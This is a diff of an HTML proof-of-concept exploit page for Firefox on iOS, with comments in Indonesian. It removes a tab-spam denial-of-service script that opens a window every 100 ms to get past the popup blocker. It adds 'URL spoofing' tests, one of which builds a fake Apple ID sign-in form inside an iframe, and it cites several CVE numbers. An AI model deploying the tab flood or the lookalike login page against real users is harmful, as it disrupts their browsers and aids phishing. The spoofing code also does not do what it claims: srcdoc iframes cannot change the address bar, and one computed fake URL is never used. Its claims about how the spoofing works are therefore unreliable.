@@ -1,57 +1,100 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Firefox iOS - Tab Spam DoS PoC</title>
+    <title>Firefox iOS - URL Spoof via Redirect PoC</title>
     <meta charset="UTF-8">
 </head>
 <body>
-    <h1>Firefox iOS DoS PoC: Popup Bypass</h1>
-    <p>⚠️ HATI-HATI: Ini bisa membuat browser crash atau sangat lambat</p>
+    <h1>Firefox iOS URL Spoofing PoC</h1>
+    <p>Menguji apakah address bar bisa dipalsukan via redirect ke non-HTTP scheme</p>
     
-    <button onclick="startSpam()" style="padding:15px;font-size:18px;background:darkorange;color:white;border:none;border-radius:5px;">
-        Start Tab Spam Test
-    </button>
-    <button onclick="stopSpam()" style="padding:15px;font-size:18px;background:gray;color:white;border:none;border-radius:5px;">
-        Stop
+    <h2>Test 1: Redirect ke internal error page</h2>
+    <button onclick="test1()" style="padding:10px;margin:5px;">
+        Test Redirect Spoof
     </button>
     
-    <p id="counter">Tabs opened: 0</p>
+    <h2>Test 2: Spoofed form login</h2>
+    <button onclick="test2()" style="padding:10px;margin:5px;">
+        Test Fake Login Page
+    </button>
+    
+    <h2>Test 3: Iframe injection test</h2>
+    <button onclick="test3()" style="padding:10px;margin:5px;">
+        Test Iframe Spoof
+    </button>
+    
+    <div id="result" style="margin-top:20px;padding:15px;border:1px solid #ccc;min-height:50px;">
+        Hasil akan muncul di sini...
+    </div>
     
     <script>
-        var intervalId = null;
-        var count = 0;
-        
-        function startSpam() {
-            if (intervalId) return;
-            
-            // Membuka banyak tab baru secara cepat untuk menguji 
-            // apakah popup blocker bisa di-bypass
-            intervalId = setInterval(function() {
-                var w = window.open('about:blank', '_blank', 'width=100,height=100');
-                if (w) {
-                    count++;
-                    document.getElementById('counter').textContent = 'Tabs opened: ' + count;
-                    w.document.write('<h1>Tab ' + count + '</h1>');
-                    
-                    // Jika terlalu banyak, coba tutup untuk mencegah crash total
-                    if (count > 50) {
-                        try { w.close(); } catch(e) {}
-                    }
-                }
-            }, 100); // 10 tabs per detik
+        function test1() {
+            // Mencoba redirect ke URL non-standar yang bisa menyebabkan
+            // address bar menampilkan URL yang salah
+            var iframe = document.createElement('iframe');
+            iframe.style.width = '100%';
+            iframe.style.height = '200px';
+            iframe.src = 'javascript:"<h1>Spoofed Content</h1><p>Address bar shows different URL</p>"';
+            document.getElementById('result').innerHTML = '';
+            document.getElementById('result').appendChild(iframe);
         }
         
-        function stopSpam() {
-            if (intervalId) {
-                clearInterval(intervalId);
-                intervalId = null;
-                document.getElementById('counter').textContent = 'Stopped at: ' + count;
-            }
+        function test2() {
+            // Membuat halaman login palsu untuk menguji apakah 
+            // bisa ditampilkan dengan URL yang tampak legitimate
+            var content = `
+                <div style="font-family:sans-serif;text-align:center;padding:40px;">
+                    <h2>Sign In - Apple ID</h2>
+                    <p style="color:gray;font-size:12px;">firefox-ios-poc.local</p>
+                    <input type="text" placeholder="Apple ID" style="width:200px;padding:8px;margin:5px;"><br>
+                    <input type="password" placeholder="Password" style="width:200px;padding:8px;margin:5px;"><br>
+                    <button style="padding:10px 30px;background:#007AFF;color:white;border:none;border-radius:5px;">
+                        Sign In
+                    </button>
+                    <p style="font-size:11px;color:red;">PoC - Do not enter real credentials!</p>
+                </div>
+            `;
+            
+            var iframe = document.createElement('iframe');
+            iframe.style.width = '100%';
+            iframe.style.height = '300px';
+            iframe.srcdoc = content;
+            document.getElementById('result').innerHTML = '';
+            document.getElementById('result').appendChild(iframe);
+        }
+        
+        function test3() {
+            // Menguji desinkronisasi address bar vs konten
+            var url = window.location.href;
+            var fakeUrl = url.replace('poc', 'google.com');
+            
+            var content = `
+                <div style="padding:20px;text-align:center;">
+                    <h1>Address Bar Spoof Test</h1>
+                    <p>Actual URL: <code>${url}</code></p>
+                    <p>But content below is loaded from this PoC page, not from the displayed domain.</p>
+                    <p style="color:red;font-size:13px;">
+                        If address bar shows something other than this page's domain, 
+                        the spoof works!
+                    </p>
+                </div>
+            `;
+            
+            var iframe = document.createElement('iframe');
+            iframe.style.width = '100%';
+            iframe.style.height = '200px';
+            iframe.srcdoc = content;
+            document.getElementById('result').innerHTML = '';
+            document.getElementById('result').appendChild(iframe);
         }
     </script>
     
-    <h2>Cara Kerja:</h2>
-    <p>Mengirim banyak <code>window.open()</code> secara cepat untuk menguji apakah</p>
-    <p>popup blocker Firefox iOS bisa dilewati (bypass) - CVE-2025-55029</p>
+    <h2>Bug yang Diuji:</h2>
+    <ul>
+        <li><strong>CVE-2025-27426</strong> - URL spoofing via server-side redirect ke internal error page</li>
+        <li><strong>CVE-2025-27424</strong> - Address bar spoofing via non-HTTP scheme redirect</li>
+        <li><strong>CVE-2026-2634</strong> - Desinkronisasi address bar dan konten</li>
+        <li><strong>CVE-2026-2032</strong> - Interupsi loading halaman baru</li>
+    </ul>
 </body>
 </html>
